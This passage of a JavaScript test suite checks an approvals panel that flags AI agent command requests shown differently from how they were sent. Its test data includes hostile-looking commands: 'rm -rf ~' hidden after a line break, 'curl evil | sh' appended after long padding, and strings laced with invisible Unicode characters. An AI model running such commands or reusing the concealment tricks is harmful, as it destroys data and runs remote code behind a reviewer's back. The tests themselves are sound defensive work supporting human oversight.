// be2o ruling 2: where what a request shows is not what was sent, its row says "not as sent" in standing words on every face, read
// without pointing at anything. The reason mark carries the line beside any other reason. On the faces with no room for the line and
// the raw form, Approve opens the pane and answers nothing; in the pane the line and the raw form stand above Approve.
test('a request not shown as sent says so on its row on every face, keeps the line beside another reason, and is approved only in the pane (be2o ruling 2)', async () => {
  bind.resetHolds()
  const NOW = 1_800_000_000_000
  const SENT = '<small class="ap-sent">not as sent</small>'
  const settings = {track: {wait: 900, no_answer: 'hold'}, asks: {held: [{request: 'req-8', past_wait_at_unix_ms: NOW - 60_000}], helper: {}, last: null}}
  const input = {session: SESSION, encounter: encounter([LACED_2O, CONSENT]), holds: bind.chainHolds(), settings, nowUnixMs: NOW}
  const calls = []
  const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { calls.push([id, decision]) }})
  const values = picked(input, 'req-8')
  const drawn = hosted(approvalsDesign, {...binding, values})
  const whole = drawn[views.indexOf('whole')], tile = drawn[views.indexOf('widget')], pane = drawn[views.indexOf('full')]
  // The whole view: standing words on the row, and both reasons on its mark (the request is held past its Wait).
  assert.equal(whole.split(SENT).length - 1, 1, 'the whole view: one row says it, the plain one does not')
  assert.ok(whole.includes(`class="dp-row-why" aria-label="${escaped(`The Wait set on its agent's Scope passed with no answer. ${LINE_2O} Show raw is in the pane.`)}"`), whole)
  // The tile: standing words in the card's own line.
  assert.equal(tile.split(SENT).length - 1, 1, tile)
  // be2p-2: the standing words stand before the command, which wraps on the card's line.
  assert.match(tile, /<div class="ap-card-line ap-card-line--cmd">.*?<b>aletheia<\/b><small class="ap-sent">not as sent<\/small><code class="ap-card-cmd">rm -rf \.\/build<\/code><\/div>/)
  // The pane: the words on the row, and the whole line and the raw form, open, above Approve.
  // be2p ruling 4: "not as sent" stands first in the cell, before the flag.
  assert.match(pane, /<span class="ap-flag">not as sent · Held past its Wait[^<]*<\/span>/)
  assert.equal(pane.split('<span class="ap-flag">not as sent').length - 1, 1, 'the pane: one row says it')
  assert.ok(pane.indexOf(`role="note" data-flagged="true">${LINE_2O}</p>`) > 0 && pane.indexOf(`data-flagged="true">${LINE_2O}</p>`) < pane.indexOf('<div class="ap-do">'), 'the line stands above the answers')
  assert.ok(pane.includes('<details class="ap-raw" open="">'), pane)
  // A flag alone, and the line alone, stand as they did.
  const flagged = hosted(approvalsDesign, {...binding, values: {...values, wait: undefined, queue: JSON.stringify([{id: 'a', kind: 'request', who: 'Kite', text: 'rm', flag: 'recursive delete', differs: LINE_2O}, {id: 'b', kind: 'request', who: 'Kite', text: 'ls', flag: 'recursive delete'}, {id: 'c', kind: 'request', who: 'Kite', text: 'ls', differs: LINE_2O}])}})[views.indexOf('whole')]
  assert.ok(flagged.includes(`aria-label="${escaped(`recursive delete. ${LINE_2O} Show raw is in the pane.`)}"`) && flagged.includes('aria-label="recursive delete"') && flagged.includes(`aria-label="${escaped(`${LINE_2O} Show raw is in the pane.`)}"`), flagged)
  // Approve on the whole view and on the tile: it chooses the item and opens the pane. No answer is set, and it is one press, not a hold.
  for (const view of ['whole', 'widget']) {
    const face = propsOn(binding, values)
    const nodes = nodesOf(approvalsDesign[view](face.p))
    // be2o-2 ruling 1: the button that opens the pane is not called Approve.
    const approve = actionsOf(nodes, 'Read as sent')[0]
    assert.equal(approve.props.does, `Opens the pane, where the request stands as it was sent. Approve it there. ${LINE_2O}`, view)
    assert.ok(!approve.props.hold, `${view}: opening needs no hold`)
    assert.equal(approve.props.disabled, undefined, view)
    approve.props.onPress()
    assert.deepEqual(face.sets, [['pick', 'req-8'], ['nav.full']], `${view}: the item is chosen and the pane opens; nothing is answered`)
    actionsOf(nodes, 'Deny')[0].props.onPress()
    assert.deepEqual(face.sets.at(-1), ['deny', 'req-8'], `${view}: Deny still declines from here`)
    // Where no pane opens from the face, Approve stands disabled and says where to answer.
    const shut = propsOn(binding, values, {})
    const closed = actionsOf(nodesOf(approvalsDesign[view](shut.p)), 'Read as sent')[0]
    assert.match(closed.props.disabled, /^No pane opens from here: read the request as it was sent in the Approvals pane/, view)
    assert.equal(closed.props.onPress, undefined, `${view}: and it has no press`)
  }
  // A plain request beside it is approved from the tile as before, by a hold.
  const face = propsOn(binding, values)
  const second = actionsOf(nodesOf(approvalsDesign.widget(face.p)), 'Approve')[0]
  assert.deepEqual([second.props.does, second.props.hold], ['Approves the request. Nothing else is allowed by it.', true])
  second.props.onPress()
  assert.deepEqual(face.sets, [['allowOnce', 'req-7']])
  // In the pane, Approve answers: the line and the raw form stand beside it.
  const inPane = propsOn(binding, values)
  buttonsOf(nodesOf(approvalsDesign.full(inPane.p)), 'Approve')[0].props.onClick()
  assert.deepEqual(inPane.sets, [['allowOnce', 'req-8']])
  await binding.write([{key: 'allowOnce', value: 'req-8'}])
  assert.deepEqual(calls, [['req-8', {outcome: 'selected', option_id: 'o1'}]])
  // A decision in its owner's words (a unit decision) is not a command: it is answered where it stands, as before.
  const decision = {...binding, values: {...values, queue: JSON.stringify([{id: 'u1', kind: 'request', who: 'Factory', text: 'Resume?', options: {allowOnce: 'Resume bounded work', deny: 'Cancel bounded work'}, differs: LINE_2O}]), pick: 'u1'}}
  const unit = propsOn(decision, decision.values)
  actionsOf(nodesOf(approvalsDesign.whole(unit.p)), 'Resume bounded work')[0].props.onPress()
  assert.deepEqual(unit.sets, [['allowOnce', 'u1']])
  bind.resetHolds()
})

// be2o rulings 3 and 4: the queue draws a command on one line, and the request's tool in a block. A command of more than one line says
// so; a tool that is not shown as it was sent is named in the card's own line. Either opens the raw form in the pane.
test('the queue says when a command has more than one line, and when the tool is not shown as sent (be2o rulings 3, 4)', () => {
  bind.resetHolds()
  const RAW = 'Show raw has it as it was sent.'
  const lines = {...CONSENT, native_request_id: 'req-2l', tool_call: {kind: 'execute', title: 'Bash', rawInput: {command: 'ls\nrm -rf ~'}}}
  const tool = {...CONSENT, native_request_id: 'req-tool', tool_call: {kind: 'exe\u{202e}cute', title: 'Bash', rawInput: {command: 'ls'}}}
  const titled = {...CONSENT, native_request_id: 'req-title', tool_call: {title: 'Ba\u{200b}sh: ls', rawInput: {command: 'ls\u{202e}'}}}
  const rows = rec.queueRows([lines, tool, titled, CONSENT], SESSION)
  assert.deepEqual([rows[0].text, rows[0].differs], ['ls\nrm -rf ~', `The command has 2 lines, drawn as one here. ${RAW}`])
  assert.deepEqual([rows[1].where, rows[1].differs], ['exe\u{202e}cute', `The tool holds characters that are not shown here. ${RAW}`])
  assert.deepEqual([rows[2].where, rows[2].differs], ['Ba\u{200b}sh', 'The command and the tool hold characters that are not shown here. Show raw has them as they were sent.'])
  assert.equal('differs' in rows[3], false, 'a plain request on one line, with a plain tool, carries no line')
  const input = {session: SESSION, encounter: encounter([lines, tool, CONSENT]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {})
  const paneOf = pick => hosted(approvalsDesign, {...binding, values: picked(input, pick)})[views.indexOf('full')]
  const two = paneOf('req-2l')
  assert.ok(two.includes('<p class="ap-what">ls rm -rf ~</p>'), 'the pane draws the two lines as one')
  assert.ok(two.includes(`<p class="ap-note ap-differs" role="note" data-flagged="true">The command has 2 lines, drawn as one here. ${RAW}</p>`), two)
  assert.ok(two.includes('<details class="ap-raw" open="">') && two.includes('ls\\nrm -rf ~'), 'and the raw form, open, has the break')
  const cleaned = paneOf('req-tool')
  assert.ok(cleaned.includes('<pre class="ap-cmd" aria-label="What it asks">execute</pre>'), cleaned)
  assert.ok(cleaned.includes(`data-flagged="true">The tool holds characters that are not shown here. ${RAW}</p>`) && cleaned.includes('<details class="ap-raw" open="">') && cleaned.includes('exe\\u202ecute'), cleaned)
  bind.resetHolds()
})

// be2o ruling 5: each answer names the harness's choice by the id the harness gave, byte for byte, and finds the request by its id
// as it came. An id that cleaning would change is sent whole.
test('Approvals sends the option id as it was given: allow once, allow always, reject, and the reject that is not "once" (be2o ruling 5)', async () => {
  bind.resetHolds()
  const ONCE = 'opt\u{202e}-1 ', ALWAYS = ' \u{feff}', NO = 'no\u{200b} ', NEVER = ' never\u{202e}', ID = ' req\u{200b}-8 '
  const odd = {...CONSENT, native_request_id: ID, choices: [{option_id: ONCE, label: 'Allow', kind: 'allow_once'}, {option_id: ALWAYS, label: 'Always', kind: 'allow_always'}, {option_id: NO, label: 'Reject', kind: 'reject_once'}]}
  const never = {...CONSENT, native_request_id: 'req-never', choices: [{option_id: NEVER, label: 'Never', kind: 'reject_always'}]}
  const calls = []
  const binding = rec.approvalsBinding({session: SESSION, encounter: encounter([odd, never]), holds: bind.chainHolds()}, {permission: async (id, decision) => { calls.push([id, decision]) }})
  assert.equal(JSON.parse(binding.values.queue)[0].id, ID, 'the row keeps the request\'s id as it came')
  for (const key of ['allowOnce', 'allowAlways', 'deny']) await binding.write([{key, value: ID}])
  await binding.write([{key: 'deny', value: 'req-never'}])
  assert.deepEqual(calls, [[ID, {outcome: 'selected', option_id: ONCE}], [ID, {outcome: 'selected', option_id: ALWAYS}], [ID, {outcome: 'selected', option_id: NO}], ['req-never', {outcome: 'selected', option_id: NEVER}]])
  assert.deepEqual(calls.map(call => call[1].option_id.length), [ONCE.length, ALWAYS.length, NO.length, NEVER.length], 'not one character shorter')
  await assert.rejects(() => binding.write([{key: 'allowOnce', value: ID.trim()}]), /no longer waits/, 'a cleaned id names no request')
  bind.resetHolds()
})

// be2o-2 ruling 1 (DLW build ruling 2026-11-11): a button that sends nothing does not say "Approve". On the whole view and the rail's
// tile, a request not shown as sent has Read as sent in Approve's place: its drawn label, its accessible name (the button's own words)
// and its Info words agree. Where no pane opens from the face it stands disabled, and standing words beside it say where to answer.
test('the button that opens the pane is named for what it does, and where no pane opens the face says where to answer (be2o-2 ruling 1)', () => {
  bind.resetHolds()
  const OPENS = `Opens the pane, where the request stands as it was sent. Approve it there. ${LINE_2O}`
  const WHERE = '<p class="ap-where" role="note">Not as sent: answer it in the Approvals pane.</p>'
  const NO_PANE = 'No pane opens from here: read the request as it was sent in the Approvals pane, and approve it there.'
  const only = {session: SESSION, encounter: encounter([LACED_2O]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(only, {permission: async () => assert.fail('a drawing answers nothing')})
  const values = picked(only, 'req-8')
  const drawnWith = (nav, view) => { host.resetHost(binding.id)
    try { return renderToStaticMarkup(createElement(host.HostedDevice, {designed: approvalsDesign, binding: {...binding, values}, view, nav})) } finally { host.resetHost(binding.id) } }
  for (const view of ['whole', 'widget']) {
    // A pane opens from the face: the button stands live under its own name, and nothing on the face is called Approve.
    const open = drawnWith({full() {}}, view)
    assert.match(open, new RegExp(`data-i="Read as sent\\\\|${escaped(OPENS).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[^"]*"[^>]*><button type="button" class="dp-action">Read as sent</button>`), `${view}: ${open}`)
    assert.ok(!open.includes('>Approve</button>') && !open.includes('data-i="Approve|'), `${view}: no button on the face says Approve`)
    assert.ok(!open.includes('ap-where'), `${view}: with a pane to open, no words say where to answer`)
    assert.ok(open.includes('>Deny</button>'), `${view}: Deny still stands`)
    // No pane opens from the face: the button stands disabled with why, and standing words say where to answer.
    const shut = drawnWith({}, view)
    assert.ok(shut.includes('<button type="button" class="dp-action" disabled="">Read as sent</button>'), `${view}: ${shut}`)
    assert.ok(shut.includes(escaped(NO_PANE)), `${view}: its Info words say why`)
    assert.equal(shut.split(WHERE).length - 1, 1, `${view}: the standing words, once`)
    assert.ok(!shut.includes('>Approve</button>'), view)
  }
  // The pane itself keeps Approve: there it answers, with the line above it. A plain request keeps Approve on every face.
  assert.ok(drawnWith({}, 'full').includes('>Approve</button>') && !drawnWith({}, 'full').includes('ap-where'))
  const plainInput = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
  const plain = hosted(approvalsDesign, rec.approvalsBinding(plainInput, {})).join('\n')
  assert.ok(plain.includes('>Approve</button>') && !plain.includes('Read as sent') && !plain.includes('ap-where'), 'a plain request is approved where it stands')
  bind.resetHolds()
})

// ── be2p (DLW build ruling 2026-11-11): the follow-ups of the review of O-I #969 ─────────────────────────────────────────────────────
const asking2p = (id, choices, command = 'ls') => ({...CONSENT, native_request_id: id, tool_call_id: `call:${id}`, tool_call: {kind: 'execute', title: 'Bash', rawInput: {command}}, choices})
const CHOICES_2P = {
  allowNow: [{option_id: 'go', label: 'Allow now'}, {option_id: 'stop', label: 'Deny'}],
  mixed: [{option_id: 'once', kind: 'allow_once', label: 'Allow'}, {option_id: 'session', label: 'Allow for this session, no more prompts'}],
  onlyYes: [{option_id: 'yes-forever', label: 'Yes, and do not ask again'}],
  kinds: [{option_id: 'a', kind: 'allow_once', label: 'Allow once'}, {option_id: 'w', kind: 'allow_always', label: 'Always'}, {option_id: 'r', kind: 'reject_once', label: 'Reject'}],
  alwaysOnly: [{option_id: 'w', kind: 'allow_always', label: 'Always'}, {option_id: 'never', kind: 'reject_always', label: 'Never'}],
}
/** A face's own button of a label, pressed: the SDK's Action on the whole view and the tile, the pane's own button in the pane. */
const pressOf = (view, nodes, label) => (view === 'full' ? buttonsOf(nodes, label)[0]?.props.onClick : actionsOf(nodes, label)[0]?.props.onPress)

// be2p ruling 1, pinned on the faces that were right: Approvals' Approve sends the harness's allow for this time or nothing, and its Deny
// sends a choice of a reject kind or the cancelled outcome, on the whole view, the tile and the pane, through the host's set and flush.
// Approvals draws no words of its own after an answer: the row stands until AIKit reports the request answered, and a refusal is the
// host's, said on the Info line.
test('Approvals\' Approve sends the allow for this time or nothing, and Deny a reject kind or the cancelled outcome, whatever the labels say (be2p ruling 1)', async () => {
  const NO_ONCE = 'The request offers no once choice; answer it in the thread pane.'
  const pick = option_id => [{outcome: 'selected', option_id}], CANCELLED = [{outcome: 'cancelled'}]
  const expected = {
    allowNow: {Approve: [[], NO_ONCE], Deny: [CANCELLED, null]},
    mixed: {Approve: [pick('once'), null], Deny: [CANCELLED, null]},
    onlyYes: {Approve: [[], NO_ONCE], Deny: [CANCELLED, null]},
    kinds: {Approve: [pick('a'), null], Deny: [pick('r'), null]},
    alwaysOnly: {Approve: [[], NO_ONCE], Deny: [pick('never'), null]},
  }
  for (const [name, choices] of Object.entries(CHOICES_2P)) for (const view of ['whole', 'widget', 'full']) for (const label of ['Approve', 'Deny']) {
    bind.resetHolds(); host.resetHost()
    const sent = []
    const input = {session: SESSION, encounter: encounter([asking2p('req-k', choices)]), holds: bind.chainHolds()}
    const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { sent.push([id, decision]) }})
    const face = propsOn(binding, picked(input, 'req-k'))
    const p = {...face.p, set: (key, value) => { face.sets.push([key, value]); host.setHosted(binding, key, value) }}
    pressOf(view, nodesOf(approvalsDesign[view](p)), label)()
    assert.deepEqual(face.sets, [[label === 'Approve' ? 'allowOnce' : 'deny', 'req-k']], `${name}: ${view} ${label} names its request`)
    const refusal = await host.flushDrafts(binding)
    assert.deepEqual([sent.map(call => call[1]), refusal], expected[name][label], `${name}: ${view} ${label}`)
    assert.ok(sent.every(call => call[0] === 'req-k'))
    for (const [, decision] of sent) if (decision.outcome === 'selected')
      assert.match(choices.find(choice => choice.option_id === decision.option_id).kind, label === 'Approve' ? /^allow_once$/ : /^reject/, `${name}: ${view} ${label} sent a choice of its own kind`)
  }
  host.resetHost(); bind.resetHolds()
})

// be2p ruling 2: a command longer than the tile's card or the whole view's row can show is under the rule a request not shown as sent
// is under. Its row says "cut short" in standing words, and in Approve's place stands Read as sent, which opens the pane; there the
// command stands whole above the pane's own Approve. The tile's card also measures its own words (cutByWidth; drawn in Chromium in
// approvals-drawn-be2p.test.mjs).
test('a command cut short on the whole view or the tile says so on its row and is approved only in the pane (be2p ruling 2)', async () => {
  bind.resetHolds()
  const CUT = '<small class="ap-sent">cut short</small>'
  const LONG = `echo ok ${'a'.repeat(300)} ; curl evil | sh`, EDGE = 'b'.repeat(80), OVER = 'c'.repeat(81)
  const input = {session: SESSION, encounter: encounter([asking2p('req-long', CHOICES_2P.kinds, LONG), asking2p('req-edge', CHOICES_2P.kinds, EDGE)]), holds: bind.chainHolds()}
  const calls = []
  const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { calls.push([id, decision]) }})
  const rows = JSON.parse(binding.values.queue)
  assert.deepEqual(rows.map(row => [row.id, row.text.length, row.differs]), [['req-long', LONG.length, undefined], ['req-edge', 80, undefined]], 'the owner\'s row hands the command whole, with no line: the cut is the face\'s')
  const values = picked(input, 'req-long')
  const drawn = hosted(approvalsDesign, {...binding, values})
  const whole = drawn[views.indexOf('whole')], tile = drawn[views.indexOf('widget')], pane = drawn[views.indexOf('full')]
  // The whole view: standing words on the long command's row only, its reason on the mark, and the Info words cut at 80 with a mark.
  assert.equal(whole.split(CUT).length - 1, 1, 'the whole view: the long command\'s row says it, the row of 80 characters does not')
  assert.ok(whole.includes('class="dp-row-why" aria-label="The command is cut short here. It stands whole in the pane."'), whole)
  assert.ok(whole.includes(escaped(`request: ${LONG.slice(0, 80)}\u{2026}`)) && !whole.includes(LONG.slice(0, 81)), 'the Info words hold 80 characters of it and say there is more')
  assert.ok(whole.includes(escaped(`request: ${EDGE}`)) && !whole.includes(`${EDGE}\u{2026}`), 'a command of 80 characters is whole')
  // The tile: the words in the card's own line.
  assert.equal(tile.split(CUT).length - 1, 1, tile)
  assert.ok(tile.includes(`</b>${CUT}<code class="ap-card-cmd">${escaped(LONG)}</code></div>`), tile)
  // The pane: the command whole, no such words (nothing is cut there), and its own Approve.
  assert.ok(pane.includes(`<p class="ap-what">${escaped(LONG)}</p>`) && !pane.includes('cut short'), pane)
  for (const view of ['whole', 'widget']) {
    const face = propsOn(binding, values)
    const nodes = nodesOf(approvalsDesign[view](face.p))
    const read = actionsOf(nodes, 'Read as sent')
    assert.equal(read.length, 1, `${view}: one request has it`)
    assert.equal(actionsOf(nodes, 'Approve').length, view === 'widget' ? 1 : 0, `${view}: the long command has no Approve; the tile's other card keeps its own`)
    assert.equal(read[0].props.does, 'Opens the pane, where the request stands as it was sent. Approve it there. The command is cut short here.', view)
    assert.deepEqual([read[0].props.hold, read[0].props.disabled], [undefined, undefined], view)
    read[0].props.onPress()
    assert.deepEqual(face.sets, [['pick', 'req-long'], ['nav.full']], `${view}: the item is chosen and the pane opens; nothing is answered`)
    actionsOf(nodes, 'Deny')[0].props.onPress()
    assert.deepEqual(face.sets.at(-1), ['deny', 'req-long'], `${view}: Deny still declines from here`)
    // Where no pane opens from the face: disabled, and the words beside it say where to answer.
    const shut = propsOn(binding, values, {})
    const closed = nodesOf(approvalsDesign[view](shut.p))
    assert.match(actionsOf(closed, 'Read as sent')[0].props.disabled, /^No pane opens from here/, view)
    assert.equal(closed.filter(node => node.type === 'p' && node.props.className === 'ap-where').map(node => node.props.children).join('|'), 'Cut short: answer it in the Approvals pane.', view)
  }
  // The command of exactly 80 characters is approved where it stands; one of 81 is not.
  const edge = propsOn(binding, picked(input, 'req-edge'))
  actionsOf(nodesOf(approvalsDesign.whole(edge.p)), 'Approve')[0].props.onPress()
  assert.deepEqual(edge.sets, [['allowOnce', 'req-edge']])
  const over = {...binding, values: {...values, queue: JSON.stringify([{id: 'o', kind: 'request', who: 'Kite', text: OVER}]), pick: 'o'}}
  assert.deepEqual([actionsOf(nodesOf(approvalsDesign.whole(propsOn(over).p)), 'Approve').length, actionsOf(nodesOf(approvalsDesign.whole(propsOn(over).p)), 'Read as sent').length], [0, 1])
  // In the pane Approve answers: the command stands whole above it.
  const inPane = propsOn(binding, values)
  buttonsOf(nodesOf(approvalsDesign.full(inPane.p)), 'Approve')[0].props.onClick()
  assert.deepEqual(inPane.sets, [['allowOnce', 'req-long']])
  // Not a command: a decision in its owner's words, and a proposal, are answered where they stand however long their words are.
  const other = {...binding, values: {...values, pick: 'u1', queue: JSON.stringify([{id: 'u1', kind: 'request', who: 'Factory', text: LONG, options: {allowOnce: 'Resume bounded work', deny: 'Cancel bounded work'}},
    {id: 'p1', kind: 'proposal', who: 'Kite', text: LONG, where: 'notes.md'}])}}
  const otherDrawn = hosted(approvalsDesign, other)
  assert.ok(!otherDrawn[views.indexOf('whole')].includes('cut short') && !otherDrawn[views.indexOf('widget')].includes('cut short'))
  const unit = propsOn(other)
  actionsOf(nodesOf(approvalsDesign.whole(unit.p)), 'Resume bounded work')[0].props.onPress()
  assert.deepEqual(unit.sets, [['allowOnce', 'u1']])
  // A request that is both: "not as sent" is the word, once, and the line is the one that names what is not shown.
  const laced = {...binding, values: {...values, pick: 'l', queue: JSON.stringify([{id: 'l', kind: 'request', who: 'Kite', text: LONG, flag: 'recursive delete', differs: LINE_2O}, {id: 'f', kind: 'request', who: 'Kite', text: LONG, flag: 'recursive delete'}])}}
  const lacedWhole = hosted(approvalsDesign, laced)[views.indexOf('whole')]
  assert.deepEqual([lacedWhole.split('<small class="ap-sent">not as sent</small>').length - 1, lacedWhole.split(CUT).length - 1], [1, 1])
  assert.ok(lacedWhole.includes(`aria-label="${escaped(`recursive delete. ${LINE_2O} Show raw is in the pane.`)}"`) && lacedWhole.includes('aria-label="recursive delete. The command is cut short here. It stands whole in the pane."'), lacedWhole)
  assert.equal(actionsOf(nodesOf(approvalsDesign.whole(propsOn(laced).p)), 'Read as sent')[0].props.does, `Opens the pane, where the request stands as it was sent. Approve it there. ${LINE_2O}`)
  // The measure the tile's card takes of its own words.
  const {cutByWidth} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')
  assert.deepEqual([cutByWidth({scrollWidth: 101, clientWidth: 100}), cutByWidth({scrollWidth: 100, clientWidth: 100}), cutByWidth({scrollWidth: 0, clientWidth: 0})], [true, false, false])
  bind.resetHolds()
})

// be2p-2 (DLW build ruling 2026-11-11): on the tile a request's command stands after who asks on a line that wraps on up to four lines
// (laid out in approvals-drawn-be2p.test.mjs). A real line break in it carries a mark, so a break the command holds is told from one the
// card's width made. Words that are not a command stay on the card's one line. The block is what the card measures: by height as by width.
test('the tile draws a command on a line that wraps, marks a real line break, and keeps other words on one line (be2p-2)', async () => {
  bind.resetHolds()
  const input = {session: SESSION, encounter: encounter([asking2p('req-two', CHOICES_2P.kinds, 'echo one\n  rm -rf ~\nls'), asking2p('req-one', CHOICES_2P.kinds, 'ls  -la')]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {permission: async () => {}})
  const tile = hosted(approvalsDesign, binding)[views.indexOf('widget')]
  const MARK = '<i class="ap-nl" aria-label="line break">\u{21b5}</i>'
  assert.ok(tile.includes(`<code class="ap-card-cmd">echo one${MARK}\n  rm -rf ~${MARK}\nls</code>`), tile)
  assert.ok(tile.includes('<code class="ap-card-cmd">ls  -la</code>'), 'one line: no mark, its white space kept')
  assert.equal(tile.split(MARK).length - 1, 2)
  // The command of several lines is still "not as sent" (the queue's own line says it has 3 lines), so Read as sent stands for it.
  const nodes = nodesOf(approvalsDesign.widget(propsOn(binding).p))
  assert.deepEqual([actionsOf(nodes, 'Read as sent').length, actionsOf(nodes, 'Approve').length], [1, 1])
  // A proposal and a decision in its owner's words: one line beside who, no block.
  const others = hosted(approvalsDesign, {...binding, values: {...binding.values, queue: JSON.stringify([{id: 'p1', kind: 'proposal', who: 'Kite', text: 'notes.md\nmore'}, {id: 'u1', kind: 'request', who: 'Factory', text: 'Resume?', options: {allowOnce: 'Resume', deny: 'Cancel'}}])}})[views.indexOf('widget')]
  assert.ok(!others.includes('ap-card-cmd') && !others.includes('ap-card-line--cmd') && !others.includes('ap-nl') && others.includes('<span>notes.md more</span>') && others.includes('<span>Resume?</span>'), others)
  // The measure: a block cut by its height counts as one cut by its width does.
  const {cutByWidth} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')
  assert.deepEqual([cutByWidth({scrollWidth: 100, clientWidth: 100, scrollHeight: 55, clientHeight: 54}), cutByWidth({scrollWidth: 100, clientWidth: 100, scrollHeight: 54, clientHeight: 54}),
    cutByWidth({scrollWidth: 101, clientWidth: 100, scrollHeight: 54, clientHeight: 54})], [true, false, true])
  const css = read('inhabitants/catalogue/panels/software-factory__approvals.css')
  assert.match(css, /\.ap-card-line--cmd \{[^}]*-webkit-line-clamp: 4;[^}]*overflow-wrap: anywhere;/, 'four lines, a break anywhere in a long word')
  assert.match(css, /\.ap-card-cmd \{[^}]*white-space: pre-wrap;/, 'the command\'s white space kept')
  bind.resetHolds()
})

// be2p ruling 3: the item under Approve changes only when the person chooses. When the chosen request leaves the queue, the pane and the
// whole view do not stand on the next one: they say the item is gone and nothing there approves anything until a row is chosen again. A
// press drawn before the change and landing after it names the request that left, and answers nothing.
test('when the chosen request goes, the pane and the whole view say so and approve nothing until the person chooses again (be2p ruling 3)', async () => {
  const GONE = 'The item that stood here is no longer in this list: it was answered or withdrawn, or Show leaves it out. Choose one in the queue.'
  const ANSWERS = new Set(['allowOnce', 'allowAlways', 'deny', 'approve', 'reject', 'changes', 'refineAccept', 'refineDiscard', 'confirm', 'recognise', 'close', 'continue'])
  for (const view of ['full', 'whole']) {
    bind.resetHolds(); host.resetHost()
    const sent = []
    const before = {session: SESSION, encounter: encounter([CONSENT, SECOND]), holds: bind.chainHolds()}
    const after = {...before, encounter: encounter([SECOND])}
    // Central's acceptance is handed too, so Approve on the whole view stands on the face's own reason and no other.
    const ports = {permission: async (id, decision) => { sent.push([id, decision]) }, approve: async () => { sent.push(['approve']) }, reject: async () => { sent.push(['reject']) }}
    const drawnOn = (input, pick) => { const binding = rec.approvalsBinding(input, ports), face = propsOn(binding, picked(input, pick))
      const p = {...face.p, set: (key, value) => { face.sets.push([key, value]); host.setHosted(binding, key, value) }}
      return {binding, sets: face.sets, p, nodes: nodesOf(approvalsDesign[view](p)), markup: hosted(approvalsDesign, {...binding, values: p.v})[views.indexOf(view)]} }
    // Before: the face stands on the chosen request, and its Approve is that request's.
    const was = drawnOn(before, 'req-7')
    const stale = pressOf(view, was.nodes, 'Approve')
    assert.equal(typeof stale, 'function', `${view}: Approve is live on the chosen request`)
    // After: the chosen request has left. The face says so and no control on it sets an answer.
    const now = drawnOn(after, 'req-7')
    assert.ok(now.markup.includes(view === 'full' ? `<p class="ap-empty" role="note">${escaped(GONE)}</p>` : '<p class="ap-where" role="note">The item chosen has left this list. Choose one in the queue.</p>'), now.markup)
    if (view === 'full') {
      assert.ok(!now.markup.includes('<div class="ap-do">') && !now.markup.includes('aria-pressed="true"'), 'the pane: no item stands, so no answer button, and no row is the chosen one')
      assert.ok(!now.markup.includes('<p class="ap-what">'), 'the next request is not drawn in its place')
    } else {
      const approves = actionsOf(now.nodes, 'Approve')
      assert.deepEqual(approves.map(action => [action.props.disabled, action.props.onPress]), [[GONE, undefined]], 'the whole view: Approve stands disabled with the reason, and has no press')
    }
    for (const node of now.nodes) for (const handler of ['onPress', 'onClick']) if (typeof node.props?.[handler] === 'function' && !node.props.disabled && node.props.role !== 'row' && !('items' in node.props)) {
      try { node.props[handler]({}) } catch { /* a control that needs a real event sets nothing */ }
    }
    assert.deepEqual(now.sets.filter(([key]) => ANSWERS.has(key)), [], `${view}: no control on the face sets an answer`)
    assert.equal(await host.flushDrafts(now.binding), null)
    assert.deepEqual(sent, [], `${view}: and nothing reached the session`)
    // The press drawn before the change, landing after it: it names the request that left, and the host says the refusal.
    host.resetHost()
    stale()
    assert.deepEqual(was.sets, [['allowOnce', 'req-7']])
    host.resetHost()
    host.setHosted(now.binding, 'allowOnce', 'req-7')
    assert.equal(await host.flushDrafts(now.binding), 'That request no longer waits: AIKit reports it answered or gone.')
    assert.deepEqual(sent, [], `${view}: the request that still waits was not approved in its place`)
    // The person chooses again: the face stands on that request and Approve is its own.
    host.resetHost()
    const again = drawnOn(after, 'req-9')
    pressOf(view, again.nodes, 'Approve')()
    assert.equal(await host.flushDrafts(again.binding), null)
    assert.deepEqual(sent, [['req-9', {outcome: 'selected', option_id: 'second-once'}]])
    // Nothing chosen yet: the face stands on the first that waits, as before (and then holds it as the choice: drawn in Chromium).
    const fresh = drawnOn(before, undefined)
    pressOf(view, fresh.nodes, 'Approve')()
    assert.equal(fresh.sets.at(-1)[0], 'allowOnce')
    // An empty queue has nothing to choose, so nothing is said to be gone; a choice Show leaves out is under the same words.
    const empty = drawnOn({...before, encounter: encounter([])}, 'req-7')
    assert.ok(!empty.markup.includes('no longer in this list') && !empty.markup.includes('has left this list'), empty.markup)
    assert.ok(!was.markup.includes('no longer in this list') && !was.markup.includes('has left this list'), 'and nothing is said while the chosen item stands')
    const hidden = rec.approvalsBinding(before, ports)
    const hiddenMarkup = hosted(approvalsDesign, {...hidden, values: {...picked(before, 'req-7'), show: 'proposals', queue: JSON.stringify([...JSON.parse(hidden.values.queue), {id: 'p1', kind: 'proposal', who: 'Kite', text: 'notes.md'}])}})[views.indexOf(view)]
    assert.ok(hiddenMarkup.includes(view === 'full' ? escaped(GONE) : 'The item chosen has left this list.'), hiddenMarkup)
  }
  host.resetHost(); bind.resetHolds()
})

// be2p ruling 5 (the review's F5, mutant m10): the standing words do not need a flag beside them. A request not shown as sent that is
// not flagged, not urgent and not past its Wait still says "not as sent" on its row on the whole view, the tile and the pane.
test('an unflagged request not shown as sent still says so in standing words on every face (be2p ruling 5)', () => {
  bind.resetHolds()
  const SENT = '<small class="ap-sent">not as sent</small>'
  const input = {session: SESSION, encounter: encounter([LACED_2O]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {permission: async () => {}})
  assert.equal(JSON.parse(binding.values.queue)[0].flag, undefined, 'the row carries no flag')
  const drawn = hosted(approvalsDesign, {...binding, values: picked(input, 'req-8')})
  const whole = drawn[views.indexOf('whole')], tile = drawn[views.indexOf('widget')], pane = drawn[views.indexOf('full')]
  assert.equal(whole.split(SENT).length - 1, 1, whole)
